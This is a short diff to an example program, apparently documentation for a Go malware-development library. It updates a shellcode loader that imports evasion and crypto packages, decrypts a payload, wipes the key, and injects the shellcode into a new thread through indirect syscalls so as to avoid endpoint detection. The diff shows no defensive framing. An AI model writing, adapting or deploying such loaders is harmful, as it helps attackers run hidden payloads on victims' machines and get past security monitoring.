@@ -183,9 +183,6 @@ encoded := encode.PowerShell("Write-Host 'Hello'")
 package main
 
 import (
-    "context"
-
-
     "github.com/oioio-space/maldev/cleanup/memory"
     "github.com/oioio-space/maldev/crypto"
     "github.com/oioio-space/maldev/evasion"
@@ -220,11 +217,13 @@ func main() {
     // 4. Wipe the key immediately
     memory.SecureZero(aesKey)
 
-    // 5. Inject shellcode
-    pipe := inject.NewPipeline(caller)
-    err = pipe.Inject(context.Background(), shellcode,
-        inject.WithMethod(inject.MethodCreateThread),
-    )
+    // 5. Inject shellcode via the indirect-syscall caller chain.
+    inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
+        Config:        inject.Config{Method: inject.MethodCreateThread},
+        SyscallMethod: wsyscall.MethodIndirect,
+    })
+    if err != nil { panic(err) }
+    if err := inj.Inject(shellcode); err != nil { panic(err) }
 
     // 6. Wipe decrypted shellcode from Go heap
     memory.SecureZero(shellcode)
